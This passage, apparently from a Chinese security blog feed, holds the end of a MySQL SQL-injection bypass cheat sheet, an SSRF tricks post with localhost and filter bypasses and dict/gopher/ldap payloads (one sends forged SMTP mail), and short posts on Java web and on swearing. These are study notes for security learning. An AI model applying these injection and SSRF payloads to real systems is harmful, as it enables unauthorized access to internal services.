((SELECT 1)a JOIN (SELECT 2)b JOIN (SELECT 3)c)</code></li><li><code>mid(user(), 1, 1)</code> =&gt; <code>mid(user() from 1 for 1)</code></li><li><code>LIMIT N, M</code> =&gt; <code>LIMIT M OFFSET N</code></li></ol><h3 id="其他系统关键字"><a href="#其他系统关键字" class="headerlink" title="其他系统关键字"></a>其他系统关键字</h3><ol><li>双写绕过关键字过滤</li><li>使用同义函数 / 语句代替，如 if 函数可用<code>case when condition then 1 else 0 end</code>语句代替</li><li>大小写</li><li>urlencode</li></ol><h3 id="单双引号被过滤-拦截-转义"><a href="#单双引号被过滤-拦截-转义" class="headerlink" title="单双引号被过滤 / 拦截 / 转义"></a>单双引号被过滤 / 拦截 / 转义</h3><ol><li>需要跳出单引号的情况：尝试是否存在编码问题而产生的SQL注入</li><li>不需要跳出单引号的情况：字符串可用十六进制表示，也可通过进制转换函数表示成其他进制，汝 base_con</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">十进制转换成二进制</span><br><span class="line">select bin(5);</span><br><span class="line">十进制转换成八进制</span><br><span class="line">select oct(5);</span><br><span class="line">十进制转换成十六进制</span><br><span class="line">select hex(5);</span><br><span class="line">二进制转换成十进制</span><br><span class="line">select conv(&#39;101&#39;,2,10);</span><br><span class="line">十进制转换成十六进制</span><br><span class="line">select conv(&#39;20&#39;,10,16);</span><br><span class="line">还原十六进制</span><br><span class="line">unhex(conv(DEC_DATA,10,16))</span><br></pre></td></tr></table></figure><h3 id="数字"><a href="#数字" class="headerlink" title="数字"></a>数字</h3><table><thead><tr><th>代替字符</th><th>数</th><th>代替字符</th><th>数</th><th>字</th><th>代替字符</th><th>数</th><th>字</th></tr></thead><tbody><tr><td>false、!pi()</td><td>0</td><td>ceil(pi()*pi())</td><td>10</td><td>A</td><td>ceil((pi()+pi())*pi())</td><td>20</td><td>K</td></tr><tr><td>true、!(!pi())</td><td>1</td><td>ceil(pi()*pi())+true</td><td>11</td><td>B</td><td>ceil(ceil(pi())*version())</td><td>21</td><td>L</td></tr><tr><td>true+true</td><td>2</td><td>ceil(pi()+pi()+version())</td><td>12</td><td>C</td><td>ceil(pi()*ceil(pi()+pi()))</td><td>22</td><td>M</td></tr><tr><td>floor(pi())、~~pi()</td><td>3</td><td>floor(pi()*pi()+pi())</td><td>13</td><td>D</td><td>ceil((pi()+ceil(pi()))*pi())</td><td>23</td><td>N</td></tr><tr><td>ceil(pi())</td><td>4</td><td>ceil(pi()*pi()+pi())</td><td>14</td><td>E</td><td>ceil(pi())*ceil(version())</td><td>24</td><td>O</td></tr><tr><td>floor(version()) //注意版本</td><td>5</td><td>ceil(pi()*pi()+version())</td><td>15</td><td>F</td><td>floor(pi()*(version()+pi()))</td><td>25</td><td>P</td></tr><tr><td>ceil(version())</td><td>6</td><td>floor(pi()*version())</td><td>16</td><td>G</td><td>floor(version()*version())</td><td>26</td><td>Q</td></tr><tr><td>ceil(pi()+pi())</td><td>7</td><td>ceil(pi()*version())</td><td>17</td><td>H</td><td>ceil(version()*version())</td><td>27</td><td>R</td></tr><tr><td>floor(version()+pi())</td><td>8</td><td>ceil(pi()*version())+true</td><td>18</td><td>I</td><td>ceil(pi()*pi()*pi()-pi())</td><td>28</td><td>S</td></tr><tr><td>floor(pi()*pi())</td><td>9</td><td>floor((pi()+pi())*pi())</td><td>19</td><td>J</td><td>floor(pi()*pi()*floor(pi()))</td><td>29</td><td>T</td></tr></tbody></table><hr><h2 id="其它"><a href="#其它" class="headerlink" title="其它"></a>其它</h2><h3 id="注释"><a href="#注释" class="headerlink" title="注释"></a>注释</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">#</span><br><span class="line">--</span><br><span class="line">&#x2F;*(MySQL-5.1)</span><br><span class="line">&#x2F;**&#x2F;(一个 *&#x2F; 可以闭合前面多个&#x2F;*)</span><br><span class="line">;%00(PDO支援多語句)</span><br><span class="line">&#96;(MySQL &lt;&#x3D; 5.5)</span><br><span class="line">&#39;or 1&#x3D;1;%00</span><br><span class="line">&#39;or 1&#x3D;1 union select 1,2&#96;&#39;</span><br><span class="line">&#39;or 1&#x3D;1 #</span><br><span class="line">&#39;&#x2F;*!50000or*&#x2F; 1&#x3D;1 -- -      &#x2F;&#x2F;版本号为5.1.38时只要小于50138</span><br><span class="line">&#39;&#x2F;*!or*&#x2F; 1&#x3D;1 -- -</span><br></pre></td></tr></table></figure><h3 id="常用"><a href="#常用" class="headerlink" title="常用"></a>常用</h3><h4 id="运算符"><a href="#运算符" class="headerlink" title="运算符"></a>运算符</h4><table><thead><tr><th>运算符</th><th>说明</th><th>运算符</th><th>说明</th></tr></thead><tbody><tr><td>&amp;&amp;</td><td>与，同and</td><td>||</td><td>或，同or</td></tr><tr><td>!</td><td>非，同not</td><td>~</td><td>一元比特反转</td></tr><tr><td>^</td><td>异或，同xor</td><td>+</td><td>加，可替代空格，如 <code>select+user()</code></td></tr></tbody></table><h4 id="系统信息函数"><a href="#系统信息函数" class="headerlink" title="系统信息函数"></a>系统信息函数</h4><table><thead><tr><th>函数</th><th>说明</th></tr></thead><tbody><tr><td>USER()</td><td>获取当前操作句柄的用户名，同 SESSION_USER()、CURRENT_USER()，有时也用 SYSTEM_USER()</td></tr><tr><td>DATABASE()</td><td>获取当前选择的数据库名，同 SCHEMA()</td></tr><tr><td>VERSION()</td><td>获取当前版本信息</td></tr></tbody></table><h4 id="进制转换"><a href="#进制转换" class="headerlink" title="进制转换"></a>进制转换</h4><table><thead><tr><th>函数</th><th>说明</th></tr></thead><tbody><tr><td>ORD(str)</td><td>返回字符串第一个字符的ASCII值</td></tr><tr><td>OCT(N)</td><td>以字符串形式返回 <code>N</code> 的八进制数，<code>N</code> 是一个BIGINT 型数值，作用相当于<code>CONV(N,10,8)</code></td></tr><tr><td>HEX(N_S)</td><td>参数为字符串时，返回 <code>N_or_S</code> 的16进制字符串形式，为数字时，返回其16进制数形式</td></tr><tr><td>UNHEX(str)</td><td><code>HEX(str)</code> 的逆向函数。将参数中的每一对16进制数字都转换为10进制数字，然后再转换成 ASCII 码所对应的字符</td></tr><tr><td>BIN(N)</td><td>返回十进制数值 <code>N</code> 的二进制数值的字符串表现形式</td></tr><tr><td>ASCII(str)</td><td>同<code>ORD(string)</code></td></tr><tr><td>CONV(N,from_base,to_base)</td><td>将数值型参数 <code>N</code> 由初始进制 <code>from_base</code> 转换为目标进制 <code>to_base</code> 的形式并返回</td></tr><tr><td>CHAR(N,… [USING charset_name])</td><td>将每一个参数 <code>N</code> 都解释为整数，返回由这些整数在 ASCII 码中所对应字符所组成的字符串</td></tr></tbody></table><h4 id="字符截取-拼接"><a href="#字符截取-拼接" class="headerlink" title="字符截取/拼接"></a>字符截取/拼接</h4><table><thead><tr><th>函数</th><th>说明</th></tr></thead><tbody><tr><td>SUBSTR(str,N_start,N_length)</td><td>对指定字符串进行截取，为SUBSTRING的简单版</td></tr><tr><td>SUBSTRING()</td><td>多种格式<code>SUBSTRING(str,pos)、SUBSTRING(str FROM pos)、SUBSTRING(str,pos,len)、SUBSTRING(str FROM pos FOR len)</code></td></tr><tr><td>RIGHT(str,len)</td><td>对指定字符串从最右边截取指定长度</td></tr><tr><td>LEFT(str,len)</td><td>对指定字符串从最左边截取指定长度</td></tr><tr><td>RPAD(str,len,padstr)</td><td>在 <code>str</code> 右方补齐 <code>len</code> 位的字符串 <code>padstr</code>，返回新字符串。如果 <code>str</code> 长度大于 <code>len</code>，则返回值的长度将缩减到 <code>len</code> 所指定的长度</td></tr><tr><td>LPAD(str,len,padstr)</td><td>与RPAD相似，在<code>str</code>左边补齐</td></tr><tr><td>MID(str,pos,len)</td><td>同于 <code>SUBSTRING(str,pos,len)</code></td></tr><tr><td>INSERT(str,pos,len,newstr)</td><td>在原始字符串 <code>str</code> 中，将自左数第 <code>pos</code> 位开始，长度为 <code>len</code> 个字符的字符串替换为新字符串 <code>newstr</code>，然后返回经过替换后的字符串。<code>INSERT(str,len,1,0x0)</code>可当做截取函数</td></tr><tr><td>CONCAT(str1,str2…)</td><td>函数用于将多个字符串合并为一个字符串</td></tr><tr><td>GROUP_CONCAT(…)</td><td>返回一个字符串结果，该结果由分组中的值连接组合而成</td></tr><tr><td>MAKE_SET(bits,str1,str2,…)</td><td>根据参数1，返回所输入其他的参数值。可用作布尔盲注，如：<code>EXP(MAKE_SET((LENGTH(DATABASE())&gt;8)+1,&#39;1&#39;,&#39;710&#39;))</code></td></tr></tbody></table><h4 id="常见全局变量"><a href="#常见全局变量" class="headerlink" title="常见全局变量"></a>常见全局变量</h4><table><thead><tr><th>变量</th><th>说明</th><th>变量</th><th>说明</th></tr></thead><tbody><tr><td>@@VERSION</td><td>返回版本信息</td><td>@@HOSTNAME</td><td>返回安装的计算机名称</td></tr><tr><td>@@GLOBAL.VERSION</td><td>同<code>@@VERSION</code></td><td>@@BASEDIR</td><td>返回MYSQL绝对路径</td></tr></tbody></table><p>可以用 <code>SHOW GLOBAL VARIABLES;</code> 查看全部全局变量</p><h4 id="其他常用函数-语句"><a href="#其他常用函数-语句" class="headerlink" title="其他常用函数 / 语句"></a>其他常用函数 / 语句</h4><table><thead><tr><th>函数/语句</th><th>说明</th></tr></thead><tbody><tr><td>LENGTH(str)</td><td>返回字符串的长度</td></tr><tr><td>PI()</td><td>返回π的具体数值</td></tr><tr><td>REGEXP “statement”</td><td>正则匹配数据，返回值为布尔值</td></tr><tr><td>LIKE “statement”</td><td>匹配数据，%代表任意内容。返回值为布尔值</td></tr><tr><td>RLIKE “statement”</td><td>与regexp相同</td></tr><tr><td>LOCATE(substr,str,[pos])</td><td>返回子字符串第一次出现的位置</td></tr><tr><td>POSITION(substr IN str)</td><td>等同于 <code>LOCATE()</code></td></tr><tr><td>LOWER(str)</td><td>将字符串的大写字母全部转成小写。同：<code>LCASE(str)</code></td></tr><tr><td>UPPER(str)</td><td>将字符串的小写字母全部转成大写。同：<code>UCASE(str)</code></td></tr><tr><td>ELT(N,str1,str2,str3,…)</td><td>与<code>MAKE_SET(bit,str1,str2...)</code>类似，根据<code>N</code>返回参数值</td></tr><tr><td>NULLIF(expr1,expr2)</td><td>若expr1与expr2相同，则返回expr1，否则返回NULL</td></tr><tr><td>CHARSET(str)</td><td>返回字符串使用的字符集</td></tr><tr><td>DECODE(<em>crypt_str</em>,<em>pass_str</em>)</td><td>使用 pass_str 作为密码，解密加密字符串 crypt_str。加密函数：<code>ENCODE(str,pass_str)</code></td></tr></tbody></table><hr>]]></content>
      
      
      
        <tags>
            
            <tag> SQL </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SSRF的一些tricks</title>
      <link href="2021/04/25/SSRF%E7%9A%84%E4%B8%80%E4%BA%9Btricks/"/>
      <url>2021/04/25/SSRF%E7%9A%84%E4%B8%80%E4%BA%9Btricks/</url>
      
        <content type="html"><![CDATA[<p>SSRF 是什么？简单地来说：利用一个可以发起网络请求的服务当作跳板来攻击内部其他服务</p><p>可以用来：</p><ul><li>探测内网信息</li><li>攻击内网或本地其他服务</li><li>穿透防火墙</li></ul><p>寻找方法：</p><ul><li>能够对外发起网络请求的地方</li><li>请求远程服务器资源的地方</li><li>数据库内置功能</li><li>邮件系统</li><li>文件处理</li><li>在线处理工具</li></ul><h1 id="一些绕过的方法"><a href="#一些绕过的方法" class="headerlink" title="一些绕过的方法"></a>一些绕过的方法</h1><h2 id="0x00-攻击本地"><a href="#0x00-攻击本地" class="headerlink" title="0x00 攻击本地"></a>0x00 攻击本地</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1:80</span><br><span class="line">http:&#x2F;&#x2F;localhost:22</span><br></pre></td></tr></table></figure><h2 id="0x01-利用ipv6"><a href="#0x01-利用ipv6" class="headerlink" title="0x01 利用ipv6"></a>0x01 利用ipv6</h2><p>利用[::]绕过localhost</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;[::1]&#x2F; &gt;&gt;&gt; http:&#x2F;&#x2F;127.0.0.1</span><br><span class="line">http:&#x2F;&#x2F;[::]&#x2F;  &gt;&gt;&gt;  http:&#x2F;&#x2F;0.0.0.0</span><br></pre></td></tr></table></figure><p>也有 <code>http://0000::1:80/</code> 这种</p><h2 id="0x02-利用"><a href="#0x02-利用" class="headerlink" title="0x02 利用@"></a>0x02 利用@</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;example.com@127.0.0.1</span><br></pre></td></tr></table></figure><h2 id="0x03-利用短地址"><a href="#0x03-利用短地址" class="headerlink" title="0x03 利用短地址"></a>0x03 利用短地址</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;dwz.cn&#x2F;11SMa  &gt;&gt;&gt;  http:&#x2F;&#x2F;127.0.0.1</span><br></pre></td></tr></table></figure><h2 id="0x04-利用特殊域名"><a href="#0x04-利用特殊域名" class="headerlink" title="0x04 利用特殊域名"></a>0x04 利用特殊域名</h2><p>利用的原理是DNS解析</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1.xip.io&#x2F;</span><br><span class="line">http:&#x2F;&#x2F;www.owasp.org.127.0.0.1.xip.io&#x2F;</span><br></pre></td></tr></table></figure><h2 id="0x05-利用DNS解析"><a href="#0x05-利用DNS解析" class="headerlink" title="0x05 利用DNS解析"></a>0x05 利用DNS解析</h2><p>在域名上设置A记录，指向127.0.1</p><h2 id="0x06-利用修改上传"><a href="#0x06-利用修改上传" class="headerlink" title="0x06 利用修改上传"></a>0x06 利用修改上传</h2><p>比如可以修改 “type=file” 为 “type=url”<br>将图片文件修改为URL，即可能触发 SSRF</p><h2 id="0x07-利用Enclosed-alphanumerics"><a href="#0x07-利用Enclosed-alphanumerics" class="headerlink" title="0x07 利用Enclosed alphanumerics"></a>0x07 利用Enclosed alphanumerics</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">利用Enclosed alphanumerics</span><br><span class="line">ⓔⓧⓐⓜⓟⓛⓔ.ⓒⓞⓜ  &gt;&gt;&gt;  example.com</span><br><span class="line">List:</span><br><span class="line">① ② ③ ④ ⑤ ⑥ ⑦ ⑧ ⑨ ⑩ ⑪ ⑫ ⑬ ⑭ ⑮ ⑯ ⑰ ⑱ ⑲ ⑳ </span><br><span class="line">⑴ ⑵ ⑶ ⑷ ⑸ ⑹ ⑺ ⑻ ⑼ ⑽ ⑾ ⑿ ⒀ ⒁ ⒂ ⒃ ⒄ ⒅ ⒆ ⒇ </span><br><span class="line">⒈ ⒉ ⒊ ⒋ ⒌ ⒍ ⒎ ⒏ ⒐ ⒑ ⒒ ⒓ ⒔ ⒕ ⒖ ⒗ ⒘ ⒙ ⒚ ⒛ </span><br><span class="line">⒜ ⒝ ⒞ ⒟ ⒠ ⒡ ⒢ ⒣ ⒤ ⒥ ⒦ ⒧ ⒨ ⒩ ⒪ ⒫ ⒬ ⒭ ⒮ ⒯ ⒰ ⒱ ⒲ ⒳ ⒴ ⒵ </span><br><span class="line">Ⓐ Ⓑ Ⓒ Ⓓ Ⓔ Ⓕ Ⓖ Ⓗ Ⓘ Ⓙ Ⓚ Ⓛ Ⓜ Ⓝ Ⓞ Ⓟ Ⓠ Ⓡ Ⓢ Ⓣ Ⓤ Ⓥ Ⓦ Ⓧ Ⓨ Ⓩ </span><br><span class="line">ⓐ ⓑ ⓒ ⓓ ⓔ ⓕ ⓖ ⓗ ⓘ ⓙ ⓚ ⓛ ⓜ ⓝ ⓞ ⓟ ⓠ ⓡ ⓢ ⓣ ⓤ ⓥ ⓦ ⓧ ⓨ ⓩ </span><br><span class="line">⓪ ⓫ ⓬ ⓭ ⓮ ⓯ ⓰ ⓱ ⓲ ⓳ ⓴ </span><br><span class="line">⓵ ⓶ ⓷ ⓸ ⓹ ⓺ ⓻ ⓼ ⓽ ⓾ ⓿</span><br></pre></td></tr></table></figure><h2 id="0x08-利用句号"><a href="#0x08-利用句号" class="headerlink" title="0x08 利用句号"></a>0x08 利用句号</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">127。0。0。1  &gt;&gt;&gt;  127.0.0.1</span><br></pre></td></tr></table></figure><h2 id="0x09-利用进制转换"><a href="#0x09-利用进制转换" class="headerlink" title="0x09 利用进制转换"></a>0x09 利用进制转换</h2><p>可以是十六进制，八进制等</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">115.239.210.26  &gt;&gt;&gt;  16373751032</span><br><span class="line">http:&#x2F;&#x2F;016373751032&#x2F;</span><br></pre></td></tr></table></figure><p>首先把这四段数字给分别转成16进制，结果：73 ef d2 1a<br>然后把 73efd21a 这十六进制一起转换成八进制<br>记得访问的时候加 0 表示使用八进制(可以是一个0也可以是多个0，跟XSS中多加几个0来绕过过滤一样)，十六进制加0x</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1  &gt;&gt;&gt;  http:&#x2F;&#x2F;0177.0.0.1&#x2F;</span><br><span class="line">http:&#x2F;&#x2F;127.0.0.1  &gt;&gt;&gt;  http:&#x2F;&#x2F;2130706433&#x2F;</span><br><span class="line">http:&#x2F;&#x2F;192.168.0.1  &gt;&gt;&gt;  http:&#x2F;&#x2F;3232235521&#x2F;</span><br><span class="line">http:&#x2F;&#x2F;192.168.1.1  &gt;&gt;&gt;  http:&#x2F;&#x2F;3232235777&#x2F;</span><br></pre></td></tr></table></figure><h2 id="0x0A-利用特殊地址"><a href="#0x0A-利用特殊地址" class="headerlink" title="0x0A 利用特殊地址"></a>0x0A 利用特殊地址</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;0&#x2F;</span><br></pre></td></tr></table></figure><h2 id="0x0B-利用协议"><a href="#0x0B-利用协议" class="headerlink" title="0x0B 利用协议"></a>0x0B 利用协议</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">Dict:&#x2F;&#x2F;</span><br><span class="line">dict:&#x2F;&#x2F;&lt;user-auth&gt;@&lt;host&gt;:&lt;port&gt;&#x2F;d:&lt;word&gt;</span><br><span class="line">ssrf.php?url&#x3D;dict:&#x2F;&#x2F;attacker:11111&#x2F;</span><br><span class="line">SFTP:&#x2F;&#x2F;</span><br><span class="line">ssrf.php?url&#x3D;sftp:&#x2F;&#x2F;example.com:11111&#x2F;</span><br><span class="line">TFTP:&#x2F;&#x2F;</span><br><span class="line">ssrf.php?url&#x3D;tftp:&#x2F;&#x2F;example.com:12346&#x2F;TESTUDPPACKET</span><br><span class="line">LDAP:&#x2F;&#x2F;</span><br><span class="line">ssrf.php?url&#x3D;ldap:&#x2F;&#x2F;localhost:11211&#x2F;%0astats%0aquit</span><br><span class="line">Gopher:&#x2F;&#x2F;</span><br><span class="line">ssrf.php?url&#x3D;gopher:&#x2F;&#x2F;127.0.0.1:25&#x2F;xHELO%20localhost%250d%250aMAIL%20FROM%3A%3Chacker@site.com%3E%250d%250aRCPT%20TO%3A%3Cvictim@site.com%3E%250d%250aDATA%250d%250aFrom%3A%20%5BHacker%5D%20%3Chacker@site.com%3E%250d%250aTo%3A%20%3Cvictime@site.com%3E%250d%250aDate%3A%20Tue%2C%2015%20Sep%202017%2017%3A20%3A26%20-0400%250d%250aSubject%3A%20AH%20AH%20AH%250d%250a%250d%250aYou%20didn%27t%20say%20the%20magic%20word%20%21%250d%250a%250d%250a%250d%250a.%250d%250aQUIT%250d%250a</span><br></pre></td></tr></table></figure><h2 id="0x0C-0-0-0-0"><a href="#0x0C-0-0-0-0" class="headerlink" title="0x0C 0.0.0.0"></a>0x0C 0.0.0.0</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;0.0.0.0&#x2F;</span><br></pre></td></tr></table></figure><p>这个方法似乎只能在Linux下使用，Windows并不认识这个ip</p><h2 id="0x0D-利用curl和其他库解析url的差异性"><a href="#0x0D-利用curl和其他库解析url的差异性" class="headerlink" title="0x0D 利用curl和其他库解析url的差异性"></a>0x0D 利用curl和其他库解析url的差异性</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;foo@127.0.0.1:80@www.google.com&#x2F;</span><br></pre></td></tr></table></figure><p><a href="https://www.blackhat.com/docs/us-17/thursday/us-17-Tsai-A-New-Era-Of-SSRF-Exploiting-URL-Parser-In-Trending-Programming-Languages.pdf">https://www.blackhat.com/docs/us-17/thursday/us-17-Tsai-A-New-Era-Of-SSRF-Exploiting-URL-Parser-In-Trending-Programming-Languages.pdf</a> 有提到，不过这个方法在curl较新的版本里被修掉了</p><p><img src="https://i.loli.net/2021/04/25/qwN3UOZzeKaXAEB.jpg"></p><h2 id="0x0E-DNS-Rebinding"><a href="#0x0E-DNS-Rebinding" class="headerlink" title="0x0E DNS Rebinding"></a>0x0E DNS Rebinding</h2><p>懒🐕表示还没搞，以后补上</p><h2 id="0x0F-127-1"><a href="#0x0F-127-1" class="headerlink" title="0x0F 127.1"></a>0x0F 127.1</h2><p>在 <code>[网鼎杯 2020 玄武组]SSRFMe</code> 这道题中有这么个点</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.1&#x2F;</span><br></pre></td></tr></table></figure><ul><li><code>ip2long(&#39;127.1&#39;)</code>会返回<code>false</code>，这里可以绕过过滤</li><li>但是<code>gethostbyname</code>在Linux下会把<code>127.1</code>变为<code>127.0.0.1</code>，所以这题是无法使用的。不过windows下经过<code>gethostbyname</code>后依然是<code>127.1</code></li><li>curl是支持<code>127.1</code>这样的写法的，但这样发出去的http请求是有问题的。因为http包中的host头被设为了<code>127.1</code>，apache会返回一个400 Bad Request</li><li>既然是http包的问题，那么用gopher协议构造一个正常的http请求即可。不过这因为<code>gethostbyname</code>的原因，这个方法这里用不了</li></ul><h2 id="0x10-127-0-0-1"><a href="#0x10-127-0-0-1" class="headerlink" title="0x10 127.0.0.1."></a>0x10 127.0.0.1.</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1.</span><br></pre></td></tr></table></figure><p>不过curl方法不支持这种写法</p><h2 id="0x11-http"><a href="#0x11-http" class="headerlink" title="0x11 http:///"></a>0x11 http:///</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;&#x2F;127.0.0.1</span><br></pre></td></tr></table></figure><p>依然是 <code>[网鼎杯 2020 玄武组]SSRFMe</code></p><hr><ul><li>这个trick也非常有意思，之前一直以为只有浏览器才会解析这样host为空的畸形url，在P师傅小密圈地旧帖里面Li4n0师傅提到curl和git也会按照浏览器的方式解析，测试一下发现直接用curl会卡在那，但是php的libcurl就可以…</li><li>用<code>parse_url</code>解析这样的畸形url会返回<code>false</code>，然后<code>$hostname=$url_parse[&#39;host&#39;];</code>会返回<code>null</code>（神奇的php)</li><li>接着又是一个windows和linux下php的差异，windows下<code>gethostbyname(null);</code>会返回本机ip，导致后面无法绕过ip检测。然而linux下并没有这样的特性，<code>gethostbyname</code>会返回<code>null</code>，绕过ip检测</li></ul><hr><p>整理了一下SSRF的一些tricks。</p>]]></content>
      
      
      
        <tags>
            
            <tag> 奇技淫巧 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>JavaWeb坑</title>
      <link href="2021/04/25/JavaWeb%E5%9D%91/"/>
      <url>2021/04/25/JavaWeb%E5%9D%91/</url>
      
        <content type="html"><![CDATA[<p>开个新坑，学 Java web 了，慢慢更了……</p><hr>]]></content>
      
      
      
        <tags>
            
            <tag> Java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>说话的艺术</title>
      <link href="2021/04/25/%E8%AF%B4%E8%AF%9D%E7%9A%84%E8%89%BA%E6%9C%AF/"/>
      <url>2021/04/25/%E8%AF%B4%E8%AF%9D%E7%9A%84%E8%89%BA%E6%9C%AF/</url>
      
        <content type="html"><![CDATA[<p>说话，是一门艺术。</p><h1 id="0x00-谈🐎"><a href="#0x00-谈🐎" class="headerlink" title="0x00 谈🐎"></a>0x00 谈🐎</h1><p>“汝母今恙否？”，问候对方的母亲，这是一种很亲切的问候，同时也是一种国骂，只是温文尔雅了一点，如果要通俗地来说，“你🐎si了”，“草尼🐎”可能更加适合于国人。</p><p>很喜欢谭总的一句骂，“嬲你妈妈别嘞”，很有韵味，越听越有意思。</p><hr><p>嬲（niǎo）：方言用字，很多时候用作脏词。通孬。在普通话中意为戏弄、搅扰，或纠缠之意。在内蒙古以及晋北方言中，意为：神气、得意，或志得意满之意。粤语中意为：生气。</p><hr><p>“嬲~”，“我嬲”，并不是用以骂人，多用于表示惊奇之感，比如“我嬲，这么屌的🐎？”，我们那一边的嬲读作<code>nia</code>，“我嬲de你li娘”，如此作为骂人的话。</p><p>这就是很神奇的一个地方，俗话说骂人不骂家人，那为甚么很多时候我们并不是直接骂对方“你是不是🐕啊，你是不是🐖啊”这一类的，而是直接上升到亲人呢，“你🐎今晚biss，buss不是亲🐎”这一类的。</p><p>可能是因为古代都有罪至株连九族，对方的行为已经足够可恨，令人过于不满，所以直接对对方的亲人进行攻击，会给人一种打出真实伤害的感觉，毕竟对方事情都做了，还会在乎你骂他吗。</p><p>还有一个很有意思的说法</p><hr><p>“拟妈死了”</p><p>我所骂的这个🐎并不真的就是你的🐎，而是我所创造出的一个虚拟的🐎，只是为了让我可以骂得更加痛快，但是虽然我现在这么骂着，但是平时日常生活中我见到了你的🐎我还是会亲切地喊一句“阿姨好”的。</p><hr><p>很天才，兄弟，这个词汇的创造真的是非常灵性，其实大家在对骂的时候并不是真的为了去诅咒对方“🐎死了”，而是为了通过骂对方的直系血缘关系的人，来使自己的气势达到一个更高的场合，来使自己在一场骂战中“取胜”。</p><p><del>好了，先到这里，下一次我们将品析一些不带脏字的骂人说法。（课设去了，逃</del></p><h1 id="0x01-优雅的古人"><a href="#0x01-优雅的古人" class="headerlink" title="0x01 优雅的古人"></a>0x01 优雅的古人</h1><p>不带脏字先姑且不谈，此刻的兴致停留在古人的优雅之间，我们来谈谈古人骂人的优雅之处。</p><p>有一说一奥，说脏话其实是检验友谊的重要标准，脏话越多，越亲密，因为脏话往往是表达感情的最直接途径，那么古人又是如何说脏话的呢？如若你只能说出“👴从未见过如此 